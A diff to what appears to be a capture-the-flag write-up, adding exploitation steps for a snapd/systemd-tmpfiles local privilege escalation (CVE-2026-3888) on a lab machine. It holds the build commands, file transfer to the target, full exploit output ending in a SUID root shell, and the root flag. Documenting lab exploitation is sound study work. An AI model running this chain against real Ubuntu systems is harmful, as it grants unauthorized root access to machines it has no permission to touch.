@@ -376,10 +376,88 @@ CVE 2026-3888
 Local privilege escalation in snapd on Linux allows local attackers to get root privilege by re-creating snap's private /tmp directory when systemd-tmpfiles is configured to automatically clean up this directory. This issue affects Ubuntu 16.04 LTS, 18.04 LTS, 20.04 LTS, 22.04 LTS, and 24.04 LTS.
 ### Exploitation
 
-poc: 
+poc: https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git
 
 ```shell
-# Commands used
+gcc -O2 -static -o exploit exploit_suid.c
+```
+
+```
+gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
+```
+
+The files are then transferred to the target host
+
+```
+python3 -m http.server 9002                     
+Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
+10.129.126.88 - - [12/Sep/2026 05:46:35] "GET /exploit HTTP/1.1" 200 -
+10.129.126.88 - - [12/Sep/2026 05:46:56] "GET /librootshell.so HTTP/1.1" 200 -
+```
+
+```
+jonathan@snapped:~$ chmod +x exploit && chmod +x librootshell.so
+```
+
+```
+jonathan@snapped:~$ ./exploit ./librootshell.so
+================================================================
+    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
+================================================================
+[*] Payload: /home/jonathan/./librootshell.so (9056 bytes)
+
+[Phase 1] Entering Firefox sandbox...
+[+] Inner shell PID: 4108
+
+[Phase 2] Waiting for .snap deletion...
+[*] Polling (up to 30 days on stock Ubuntu).
+[*] Hint: use -s to skip.
+[+] .snap deleted.
+
+[Phase 3] Destroying cached mount namespace...
+cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_U7v65y//dev: No such file or directory
+[+] Namespace destroyed.
+
+[Phase 4] Setting up and running the race...
+[*]   Working directory: /proc/4108/cwd
+[*]   Building .snap and .exchange...
+[*]   285 entries copied to exchange directory
+[*]   Starting race...
+[*]   Monitoring snap-confine (child PID 4199)...
+
+[!]   TRIGGER — swapping directories...
+[+]   SWAP DONE — race won!
+[*]   ld-linux in namespace: jonathan:jonathan 755
+[+]   Poisoned namespace PID: 4199
+
+[Phase 5] Injecting payload into poisoned namespace...
+[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
+[*]   Planting busybox...
+[*]   Writing escape script → /tmp/sh
+[*]   Overwriting ld-linux-x86-64.so.2...
+[+]   Payload injected.
+
+[Phase 6] Triggering root via SUID snap-confine...
+[*]   snap-confine → snap-confine (SUID trigger)
+[*]   Exit status: 0
+
+[Phase 7] Verifying...
+[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
+[*] Cleaning up background processes...
+
+================================================================
+  ROOT SHELL: /var/snap/firefox/common/bash -p
+================================================================
+
+bash-5.1# id
+uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
+```
+
+### Root flag
+
+```
+bash-5.1# cat /root/root.txt
+f895b9ebd14df064757fc61cb4f87d1b censor the flag
 ```
 
 ---
